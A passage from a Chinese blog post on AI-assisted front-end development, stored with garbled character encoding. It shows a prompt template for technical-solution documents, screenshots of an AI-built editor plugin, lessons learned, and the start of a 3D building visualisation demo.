ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„æŠ€æœ¯æ–‡æ¡£åŠ©æ‰‹ï¼Œä¸¥æ ¼éµå¾ªæ–‡æ¡£ç»“æ„ï¼Œæä¾›å®Œæ•´çš„ä¿¡æ¯ã€‚

## æ–‡æ¡£ç»“æ„æ¨¡ç‰ˆ

# [äº§å“åç§°]-æŠ€æœ¯æ–¹æ¡ˆæ–‡æ¡£

## 1ã€åŠŸèƒ½è¦ç‚¹åˆ†æ

ä»‹ç»ä¸€ä¸‹å°†æ ¸å¿ƒåŠŸèƒ½æ‹†è§£åçš„å„ä¸ªæ¨¡å—

### 1.1ã€xxæ¨¡å—
| åŠŸèƒ½ç‚¹ | æŠ€æœ¯è¦ç‚¹ | å¤æ‚åº¦ |
|-------|---------|--------|

## 2ã€æŠ€æœ¯æ¶æ„è®¾è®¡

&gt; [ç®€å•è¯´æ˜ä¸€ä¸‹ï¼Œæ•´ä½“çš„æŠ€æœ¯æ¶æ„è®¾è®¡ï¼Œé‡‡ç”¨äº†ä»€ä¹ˆæ¶æ„/æ¨¡å¼/...]

### 2.1ã€æ•´ä½“æ¶æ„
ä½¿ç”¨`ASCII`å­—ç¬¦ï¼Œé€šè¿‡ç»“æ„ç¤ºæ„æè¿°æ¶æ„è®¾è®¡
\`\`\`markdown
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                       åŸºç¡€å±‚ (Infrastructure)                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚ é€šä¿¡         â”‚  â”‚   å­˜å‚¨      â”‚  â”‚     Utils           â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
\`\`\`

### 2.2ã€æ¨¡å—åˆ’åˆ†
| æ¨¡å—åç§° | èŒè´£æè¿° | æ‰€åœ¨å±‚çº§ |
|---------|---------|---------|

## 3ã€æ ¸å¿ƒæŠ€æœ¯æ–¹æ¡ˆ
ä»‹ç»ä¸€ä¸‹é¡¹ç›®çš„æ ¸å¿ƒæŠ€æœ¯ç‚¹ï¼ŒæŠ€æœ¯éš¾ç‚¹/æŠ€æœ¯äº®ç‚¹

## 4ã€ä¸šç•Œæ–¹æ¡ˆè°ƒç ”
ä¸šç•Œç±»ä¼¼äº§å“æ–¹æ¡ˆè°ƒç ”ç»“æœï¼Œå‚è€ƒä»·å€¼ç­‰ä¿¡æ¯

### 4.1ã€ç›¸å…³å¼€æºé¡¹ç›®
| é¡¹ç›® | ç±»å‹ | ä¸»è¦ç”¨é€” | å‚è€ƒä»·å€¼ |
|-----|------|---------|---------|

### 4.2ã€xxé¡¹ç›®æ–¹æ¡ˆåˆ†æ
...

## 5ã€é¡¹ç›®è§„èŒƒè®¾è®¡

### 5.1ã€ä»£ç ç»„ç»‡è§„èŒƒ
\`\`\`markdown
src/
â”œâ”€â”€ views/                  # è§†å›¾æ¨¡å—
â”‚   â”œâ”€â”€ index.ts
â”‚   â””â”€â”€ services/
â”œâ”€â”€ components/             # å…¬ç”¨ç»„ä»¶æ¨¡å—
â”‚   â”œâ”€â”€ ...
â”œâ”€â”€ hooks/                  # å…¬ç”¨Hook
â”‚   â”œâ”€â”€ ...
â”œâ”€â”€ utils/                  # å·¥å…·æ¨¡å—
â”‚   â”œâ”€â”€ ...
â””â”€â”€ package.json
\`\`\`

### 5.2ã€è®¾è®¡åŸåˆ™
| åŸåˆ™ | è¯´æ˜ | å®è·µæ–¹å¼ |
|-----|------|---------|

### 5.3ã€æµ‹è¯•ç­–ç•¥
| æµ‹è¯•ç±»å‹ | è¦†ç›–èŒƒå›´ | å·¥å…· |
|---------|---------|-----|

## 6ã€æŠ€æœ¯é€‰å‹æ€»ç»“

### 6.1ã€æ ¸å¿ƒæŠ€æœ¯æ ˆ
| ç±»åˆ« | é€‰å‹ | è¯´æ˜ |
|-----|------|-----|

### 6.2ã€å¼€å‘ä¸è´¨é‡ä¿éšœ
| ç±»åˆ« | é€‰å‹ | è¯´æ˜ |
|-----|------|-----|

## 7ã€é£é™©è¯„ä¼°ä¸åº”å¯¹

&gt;åˆ†ç‚¹è¯´æ˜å¯èƒ½å­˜åœ¨çš„é£é™©ï¼Œä¾‹å¦‚æŸä¸ªæ ¸å¿ƒèƒ½åŠ›çš„å®ç°ï¼Œä»¥åŠç›¸å…³å½±å“å’Œå¦‚ä½•åº”å¯¹

æœ€åä»¥è¡¨æ ¼å½¢å¼å±•ç¤º
| é£é™© | å½±å“ | æ¦‚ç‡ | åº”å¯¹æªæ–½ |
|-----|------|-----|---------|

## 8ã€å…¶ä»–å†…å®¹
ä¾‹å¦‚ï¼Œä¸“ä¸šæœ¯è¯­ã€ä¿®è®¢çš„è®°å½•ç­‰ç­‰

### ä¸“ä¸šæœ¯è¯­
| æœ¯è¯­ | è¯´æ˜ |
|-----|------|

### ä¿®è®¢è®°å½•
| ç‰ˆæœ¬ | æ—¥æœŸ | ä¿®è®¢å†…å®¹ | ä½œè€… |
|-----|------|---------|-----|
</span></code></pre>
<h5 data-id="heading-18">1.4.5ã€AIÂ è¾…åŠ©å®ç°æ­¥éª¤è§„åˆ’</h5>
<p>æç¤ºè¯å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">è¯·ä½ æ ¹æ® @docs/éœ€æ±‚åˆ†ææ–‡æ¡£.md @docs/æŠ€æœ¯æ–¹æ¡ˆæ–‡æ¡£.md ï¼Œå¸®æˆ‘è§„åˆ’ä¸€ä¸‹é¡¹ç›®çš„å…·ä½“å®ç°æ­¥éª¤ã€‚

æ³¨æ„ä¸€ä¸‹å‡ ç‚¹ï¼š
1ã€å¼€å‘äººåŠ›ä¸º2äººï¼Œå‡ä¸ºå‰ç«¯å¼€å‘
2ã€å¼€å‘ä¸æ˜¯å…¨å¤©æŠ•å…¥ï¼Œä½ å¯ä»¥æŒ‰ç…§äººå‡3.0å·¥æ—¶è®¡ç®—ï¼Œéå·¥ä½œæ—¥ä¸ç®—ã€‚
3ã€å¯ä»¥åˆ†é˜¶æ®µå®ç°ï¼Œä»¥ä¸€ä¸ªå¯è¿è¡Œçš„Demoåˆ’åˆ†

å†…å®¹å¸®æˆ‘å†™å…¥åˆ° å®ç°æ­¥éª¤è§„åˆ’æ–‡æ¡£.mdä¸­ 
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cddc245d8be748b0bfe41be3335e5fdb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=7J2x%2F6RxTws5XwqAH3e1vmo31zA%3D" alt="image.png" loading="lazy"/></p>
<p>ä»¥ä¸Šå†…å®¹ä»…ä½œä¸ºä¸€ä¸ªç®€è¦ç¤ºä¾‹ï¼Œå®é™…ä½¿ç”¨è¿‡ç¨‹ä¸­å¯æ ¹æ®å„è‡ªçš„ä¸šåŠ¡èƒŒæ™¯ä¸é¡¹ç›®ç‰¹ç‚¹çµæ´»ç¼–å†™å’Œè°ƒæ•´æç¤ºè¯ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå€ŸåŠ©Â AIÂ çš„è¾…åŠ©ï¼Œæˆ‘ä»¬èƒ½å¤Ÿç›¸å¯¹é«˜æ•ˆåœ°å®Œæˆé˜¶æ®µåˆ’åˆ†ä¸æµç¨‹è§„åˆ’ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œç ”å‘å·¥ä½œå³å¯æŒ‰ç…§æ—¢å®šè§„åˆ’å¾ªåºæ¨è¿›ï¼Œåœ¨æ¯ä¸ªé˜¶æ®µç»“åˆå®é™…æƒ…å†µè¿›è¡ŒéªŒè¯ä¸è°ƒæ•´ï¼Œä»è€Œé€æ­¥æ¨åŠ¨é¡¹ç›®è½åœ°ã€‚</p>
<hr/>
<p>è‡³äºâ€œé˜¶æ®µäºŒï¼šäººå·¥ä¸»å¯¼ã€AIÂ è¾…åŠ©â€è¿™ä¸€éƒ¨åˆ†çš„å†…å®¹ï¼Œè¿™é‡Œå°±ä¸å¤šåšä»‹ç»ï¼Œç›¸ä¿¡å¤§å®¶åœ¨å¹³æ—¶çš„å¼€å‘è¿‡ç¨‹ä¸­ä¹Ÿç»å¸¸ä¼šå€ŸåŠ©Â AIÂ æ¥è¾…åŠ©å¼€å‘ï¼Œä¾‹å¦‚Â ä»£ç Â <code>TAB</code>Â è¡¥å…¨ã€å€ŸåŠ© <code>Agent</code> ç”Ÿæˆå·¥å…·å‡½æ•°ç­‰ç­‰ã€‚</p>
<h4 data-id="heading-19">1.5ã€å®è·µæˆæœ</h4>
<p>åœ¨ç¡®å®šç›®æ ‡ä¹‹åï¼Œæ•´ä¸ªå®è·µè¿‡ç¨‹åœ¨Â AIÂ çš„æŒç»­è¾…åŠ©ä¸‹ï¼Œé€æ­¥å®Œå–„ã€‚æœ€ç»ˆï¼Œæˆ‘ä»¬å®Œæˆäº†è¿™æ ·çš„æ’ä»¶èƒ½åŠ›ã€‚</p>
<ul>
<li><strong>åŠŸèƒ½ç‚¹ä¸€ï¼šè‡ªåŠ¨ç”Ÿæˆä»£ç ï¼ˆè‡ªåŠ¨ç”Ÿæˆã€æ’å…¥å…‰æ ‡æ‰€åœ¨ä½ç½®ï¼‰</strong></li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/417ccce413aa49edb1ff9b29155d5ee5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=PbcEU0oF2p4jh3Qybsw9%2BzQdCPE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8af151cb7af440079c4ac62bd43eb0cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=OGnL1YbsvZ0kATwU9bUcrIy5W6w%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>
<p><strong>åŠŸèƒ½ç‚¹äºŒï¼šæ¥å£ç®¡ç†ï¼ˆç­›é€‰ã€åˆ·æ–°ã€çŠ¶æ€æ›´æ–°æç¤ºï¼‰</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82f9a2713db142ec8e5cc5771ac5000d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=9r1ejYrHlBLYxGYglA7BePqX3BE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3cc4b8a6c8b344f395454e4c94b7c334~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=prtN5wW1%2BgX398h%2B0j5YGo0JEuk%3D" alt="image.png" loading="lazy"/></p>
</li>
<li>
<p><strong>åŠŸèƒ½ç‚¹ä¸‰ï¼šAPIåˆ†æ</strong></p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bef93160af4c4d929efb816bc40f81c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=8BenwsRjJ9hLt3NfKruh%2B3InEG0%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10fa2b5f01564af68225b7ff65a44fa9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=lfmmkc4s6FO4udlQzjQ1JnuVpB8%3D" alt="image.png" loading="lazy"/></p>
<p><strong>åŠŸèƒ½ç‚¹å››ï¼šç»„ä»¶ä¿¡æ¯æç¤ºï¼ˆå±æ€§è¡¥å…¨ã€ç»„ä»¶åŠå±æ€§æç¤ºï¼‰</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d22e5a69e73e4cea89f7163d02b8a050~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=5S6v%2Fbwco4YF5LDUeIS7nj2E3u0%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bb5fde82096491cbd0112b461a60ef8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=rRLnxZftOvKVfy9X%2FXiR8padup0%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56b90e908f8b4ccfad4470f0871c38cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=J8EGKHyyMbClWF7JEkrQ1NKNBAk%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>åœ¨è¿™ä¸€å®è·µè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ·±åº¦å¼•å…¥å¹¶ç³»ç»Ÿæ€§åœ°ç»“åˆäº†Â AIÂ èƒ½åŠ›ï¼Œåœ¨ä¸¥æ ¼ä¿éšœäº¤ä»˜è´¨é‡çš„å‰æä¸‹æ¨è¿›ä¸å®Œæˆç›¸å…³å·¥ä½œã€‚åŒæ—¶ï¼Œä¹Ÿåœ¨å®è·µä¸­æ²‰æ·€å¹¶æ€»ç»“äº†ä¸€å¥—è¡Œä¹‹æœ‰æ•ˆçš„Â AIÂ è¾…åŠ©ç ”å‘ç»éªŒã€‚</p>
</blockquote>
<h4 data-id="heading-20">1.6ã€AIÂ è¾…åŠ©ç ”å‘å°ç»“</h4>
<ol>
<li>AIÂ åœ¨è§„åˆ’ä¸ä¿¡æ¯æ•´ç†æ–¹é¢å…·å¤‡å¤©ç„¶ä¼˜åŠ¿</li>
<li>AIÂ æ˜¯ç ”å‘è¿‡ç¨‹ä¸­çš„åä½œåŠ©æ‰‹ï¼Œè€Œéäººå·¥ç¼–ç çš„å®Œå…¨æ›¿ä»£</li>
<li>æ•ˆç‡æå‡å°†åå‘æ¨åŠ¨å›¢é˜Ÿå¯¹Â AIÂ çš„æ›´æ·±åº¦ä½¿ç”¨</li>
<li>é«˜è´¨é‡æç¤ºè¯æ˜¯å‘æŒ¥Â AIÂ ä»·å€¼çš„å…³é”®å‰æ</li>
<li>æ–°å·¥ç¨‹åº”å§‹ç»ˆåšæŒâ€œæ–‡æ¡£å…ˆè¡Œâ€çš„ç ”å‘åŸåˆ™</li>
<li>å¯¹Â AIÂ ç”Ÿæˆçš„å†…å®¹ä¸€å®šè¦ä»”ç»†åˆ¤åˆ«ï¼Œä¸è¦å…¨ç›˜æ¥å—</li>
</ol>
<h3 data-id="heading-21">äºŒã€AIÂ èµ‹èƒ½ä¸ªäººæˆé•¿</h3>
<p>åœ¨é¢å¯¹é™Œç”Ÿå´åˆå……æ»¡å¸å¼•åŠ›çš„æŠ€æœ¯æˆ–çŸ¥è¯†é¢†åŸŸæ—¶ï¼Œå¾ˆå¤šäººæˆ–è®¸éƒ½æœ‰è¿‡ç±»ä¼¼çš„ä½“éªŒï¼šå¿ƒç”Ÿå…´è¶£ï¼Œå´ä¸€æ—¶ä¸çŸ¥ä»ä½•å…¥æ‰‹ï¼›æ¸´æœ›äº²æ‰‹åšå‡ºä¸€äº›æˆæœï¼Œå´åˆè¢«è¾ƒé«˜çš„å­¦ä¹ æˆæœ¬å’Œé—¨æ§›æ‰€åŠé€€ã€‚<br/>
è€Œéšç€Â AIÂ æŠ€æœ¯çš„å¿«é€Ÿå‘å±•ï¼Œè¿™ç§â€œæƒ³åšå´ä¸æ•¢åšâ€çš„å±€é¢æ­£åœ¨è¢«é€æ­¥æ‰“ç ´ã€‚è·¨é¢†åŸŸæ¢ç´¢ä¸å†æ˜¯å°‘æ•°ä¸“ä¸šäººå£«çš„ä¸“åˆ©ï¼Œè¶Šæ¥è¶Šå¤šéç§‘ç­èƒŒæ™¯çš„å¼€å‘è€…ï¼Œå€ŸåŠ©Â AIÂ æˆåŠŸå®Œæˆäº†ç½‘é¡µã€AppÂ ä¹ƒè‡³å®Œæ•´äº§å“çš„æ­å»ºï¼›ä¹Ÿæœ‰è¶Šæ¥è¶Šå¤šä»ä¸šè€…ï¼Œé€šè¿‡Â AIÂ å®ç°äº†è·¨ä¸“ä¸šã€è·¨é¢†åŸŸçš„èƒ½åŠ›æ‹“å±•ä¸æŠ€èƒ½å‡çº§ã€‚</p>
<p>æˆ‘è‡ªå·±ä¹Ÿæ·±æœ‰åŒæ„Ÿã€‚å¹³æ—¶åœ¨æµè§ˆæŠ€æœ¯å†…å®¹æˆ–è§†é¢‘æ—¶ï¼Œå¸¸å¸¸ä¼šè¢«ä¸€äº›æ–°é¢–çš„æŠ€æœ¯åº”ç”¨æˆ–åˆ›æ„ä½œå“æ‰€å¸å¼•ï¼Œçœ¼å‰ä¸€äº®çš„åŒæ—¶ï¼Œä¹Ÿä¸å…äº§ç”Ÿä¸€ä¸ªæƒ³æ³•ï¼šæœ‰ä¸€å¤©ï¼Œè‡ªå·±æ˜¯å¦ä¹Ÿèƒ½åšå‡ºç±»ä¼¼çš„äº§å“ï¼Ÿè€ŒÂ AIï¼Œæ­£åœ¨è®©è¿™ç§æƒ³æ³•å˜å¾—å‰æ‰€æœªæœ‰åœ°å¯è¡Œã€‚</p>
<hr/>
<p>ä¸‹é¢çš„æ¡ˆä¾‹ï¼Œæ­£æ˜¯æˆ‘åœ¨Â AIÂ çš„è¾…åŠ©ä¸‹é€æ­¥æ¢ç´¢æœªçŸ¥é¢†åŸŸã€ä¸æ–­æ‹“å±•èƒ½åŠ›è¾¹ç•Œçš„å®è·µè¿‡ç¨‹ã€‚åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œæˆ‘å€ŸåŠ©Â AIÂ å®Œæˆäº†ä¸€ä¸ªç®€æ˜“ç‰ˆÂ Demoï¼Œä¸ä»…éªŒè¯äº†æƒ³æ³•çš„å¯è¡Œæ€§ï¼Œä¹Ÿæ”¶è·äº†ä¸å°‘æ–°çš„è®¤çŸ¥ä¸ç»éªŒã€‚ä¸‹é¢ä¸€èµ·æ¥çœ‹çœ‹è¿™ä¸ªè¿‡ç¨‹å§ã€‚</p>
<h4 data-id="heading-22">2.1ã€å°è¯•åŸå› ä¸ç›®æ ‡</h4>
<h5 data-id="heading-23">2.1.1ã€å°è¯•åŸå› </h5>
<p>ä¸€æ–¹é¢ï¼Œ3DÂ å¯è§†åŒ–ä¸€ç›´æ˜¯æˆ‘ä¸ªäººæ„Ÿå…´è¶£ä½†è¾ƒå°‘å®é™…æ¶‰è¶³çš„æŠ€æœ¯æ–¹å‘ã€‚ç›¸è¾ƒäºå¸¸è§„çš„Â WebÂ é¡µé¢å¼€å‘ï¼Œ3DÂ åœºæ™¯åœ¨ç©ºé—´è¡¨è¾¾ã€ä¿¡æ¯ç»„ç»‡å’Œäº¤äº’ä½“éªŒä¸Šå…·å¤‡æ›´å¼ºçš„è¡¨ç°åŠ›ï¼Œä½†åŒæ—¶ä¹Ÿä¼´éšç€æ›´é«˜çš„å­¦ä¹ æˆæœ¬å’ŒæŠ€æœ¯é—¨æ§›ï¼Œè¿™ä½¿å¾—æˆ‘é•¿æœŸåœç•™åœ¨â€œæ„Ÿå…´è¶£å´æœªçœŸæ­£å…¥æ‰‹â€çš„é˜¶æ®µã€‚</p>
<p>å¦ä¸€æ–¹é¢ï¼Œæˆ‘å¸Œæœ›å€ŸåŠ©è¿™æ¬¡å®è·µï¼ŒéªŒè¯Â AIÂ åœ¨è·¨é¢†åŸŸå­¦ä¹ ä¸æ¢ç´¢ä¸­çš„å®é™…ä»·å€¼ã€‚åœ¨å¹¶éç³»ç»ŸæŒæ¡Â 3DÂ å›¾å½¢å­¦ã€<code>Three.js</code>Â ç­‰ç›¸å…³çŸ¥è¯†çš„å‰æä¸‹ï¼ŒAIÂ æ˜¯å¦èƒ½å¤Ÿåœ¨æ–¹æ¡ˆæ‹†è§£ã€æŠ€æœ¯é€‰å‹ã€å®ç°è·¯å¾„è§„åˆ’ä»¥åŠå…·ä½“ç¼–ç è¿‡ç¨‹ä¸­ï¼ŒæŒç»­æä¾›æœ‰æ•ˆæ”¯æŒï¼Œå¸®åŠ©æˆ‘å®Œæˆä¸€ä¸ªâ€œä»Â 0Â åˆ°Â 1â€çš„å¯è¿è¡Œæˆæœï¼Œæ˜¯æˆ‘éå¸¸å…³å¿ƒçš„é—®é¢˜ã€‚</p>
<h5 data-id="heading-24">2.1.2ã€ç›®æ ‡è®¾å®š</h5>
<p>åŸºäºä¸Šè¿°èƒŒæ™¯ï¼Œè¿™æ¬¡å°è¯•å¹¶æœªè¿½æ±‚å¤æ‚æˆ–é«˜åº¦å®Œæ•´çš„äº§å“å½¢æ€ï¼Œè€Œæ˜¯èšç„¦äºä¸€ä¸ª<strong>æ¸…æ™°ã€å¯è½åœ°ã€å¯éªŒè¯çš„æœ€å°ç›®æ ‡</strong>ï¼š</p>
<ul>
<li>æ„å»ºä¸€ä¸ªÂ <strong>3DÂ å»ºç­‘å¯è§†åŒ–é¡µé¢</strong>ï¼Œä»¥å¤šæ¥¼å±‚å»ºç­‘ä¸ºè½½ä½“ï¼›</li>
<li>æ”¯æŒæ¥¼å±‚åˆ‡æ¢ä¸å±•ç¤ºæ§åˆ¶ï¼Œå¯æŒ‰éœ€æŸ¥çœ‹å½“å‰æ¥¼å±‚æˆ–æ•´ä½“ç»“æ„ï¼›</li>
<li>åœ¨æ¥¼å±‚ä¸­ä»¥åŒºåŸŸå½¢å¼å‘ˆç°åŠŸèƒ½åˆ†åŒºä¿¡æ¯ï¼ˆå¦‚åŠå…¬åŒºã€ç”µæ¢¯é—´ç­‰ï¼‰ï¼Œå¹¶é€šè¿‡é¢œè‰²æˆ–æ ‡æ³¨è¿›è¡ŒåŒºåˆ†ï¼›</li>
<li>é€šè¿‡è¿™ä¸€Â Demoï¼ŒéªŒè¯åœ¨Â AIÂ è¾…åŠ©ä¸‹ï¼Œè‡ªå·±æ˜¯å¦èƒ½å¤Ÿï¼š
<ul>
<li>å¿«é€Ÿç†è§£é™Œç”Ÿé¢†åŸŸçš„æ ¸å¿ƒæ¦‚å¿µï¼›</li>
<li>å°†æŠ½è±¡æƒ³æ³•é€æ­¥æ‹†è§£ä¸ºå¯å®ç°çš„æŠ€æœ¯æ–¹æ¡ˆï¼›</li>
<li>æœ€ç»ˆäº§å‡ºä¸€ä¸ªå…·å¤‡åŸºç¡€äº¤äº’ä¸å±•ç¤ºä»·å€¼çš„å®é™…æˆæœã€‚</li>
</ul>
</li>
</ul>
<p>ä»ç»“æœæ¥çœ‹ï¼Œè¿™ä¸ªÂ 3DÂ å»ºç­‘Â DemoÂ ä¸ä»…å¸®åŠ©æˆ‘å®Œæˆäº†å¯¹Â 3DÂ æŠ€æœ¯çš„åˆæ­¥â€œç ´å†°â€ï¼Œä¹Ÿè®©æˆ‘æ›´åŠ ç›´è§‚åœ°æ„Ÿå—åˆ°ï¼š<strong>AIÂ æ­£åœ¨æ˜¾è‘—é™ä½è·¨é¢†åŸŸæ¢ç´¢çš„è¯•é”™æˆæœ¬ï¼Œä½¿â€œå…ˆåšå‡ºæ¥ï¼Œå†é€æ­¥ä¼˜åŒ–â€æˆä¸ºä¸€ç§ç°å®å¯è¡Œçš„å­¦ä¹ è·¯å¾„ã€‚</strong></p>
<h4 data-id="heading-25">2.2ã€å®è·µæˆæœ</h4>
<p>åœ¨æ˜ç¡®ç›®æ ‡ä¹‹åï¼Œæ•´ä¸ªå®è·µè¿‡ç¨‹å¹¶éä¸€æ¬¡æ€§å®Œæˆï¼Œè€Œæ˜¯åœ¨Â AIÂ çš„æŒç»­è¾…åŠ©ä¸‹ï¼Œé€æ­¥æ¨è¿›å’Œå®Œå–„ã€‚æœ€ç»ˆï¼Œæˆ‘å®Œæˆäº†ä¸€ä¸ªå…·å¤‡åŸºç¡€äº¤äº’èƒ½åŠ›çš„Â 3DÂ å»ºç­‘å¯è§†åŒ–Â Demoã€‚</p>
<ul>
<li><strong>åŠŸèƒ½ä¸€ï¼šæ•´ä½“é¢„è§ˆ</strong></li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/925160895a0246d6ae968e901890b0e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=mUO2hbpVtECtaMIRNhBbOkzknXA%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>åŠŸèƒ½äºŒï¼šå…¶å®ƒæ¥¼å±‚é€æ˜åŒ–</strong></li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a9d0812dcdd4475bd6d7e9e691491e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=41QahfIUFMkZN31ZzU4%2Ba6%2BF9E8%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>åŠŸèƒ½ä¸‰ï¼šå•æ¥¼å±‚é¢„è§ˆ</strong></li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/880102495e6b4d7f96cba64000b38fb5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=oW2d6xvRoHeeZMqKFP%2B6lQdWFLU%3D" alt="image.png" loading="lazy"/></p>
<p>å…¶å®ç°è¿‡ç¨‹ä¹Ÿæ¸…æ™°åœ°ä½“ç°äº†Â AIÂ åœ¨ä¸åŒé˜¶æ®µæ‰€å‘æŒ¥çš„ä»·å€¼ï¼Œä¸‹é¢æˆ‘ä¸ºå¤§å®¶ç®€å•ä»‹ç»ä¸€ä¸‹ã€‚</p>
<h5 data-id="heading-26">2.2.1ã€é¡¹ç›®æ­å»ºè¿‡ç¨‹</h5>
<p>ä¸‹å›¾å±•ç¤ºäº†æˆ‘åœ¨æ•´ä¸ªé¡¹ç›®æ­å»ºè¿‡ç¨‹ä¸­ï¼Œä¸Â AIÂ çš„ä¸»è¦å¯¹è¯ä¸æ¨è¿›è®°å½•ã€‚æ•´ä½“é¡¹ç›®ä»é›¶å¼€å§‹åˆ°å¯ç”¨Â DemoÂ äº§å‡ºï¼Œå¤§çº¦èŠ±è´¹äº†Â <strong>2Â å¤©æ—¶é—´</strong>å®Œæˆï¼ˆç•Œé¢ä¸åŠŸèƒ½ä»¥éªŒè¯æ€è·¯ä¸ºä¸»ï¼Œæ•´ä½“åç®€æ´ï¼‰ã€‚</p>
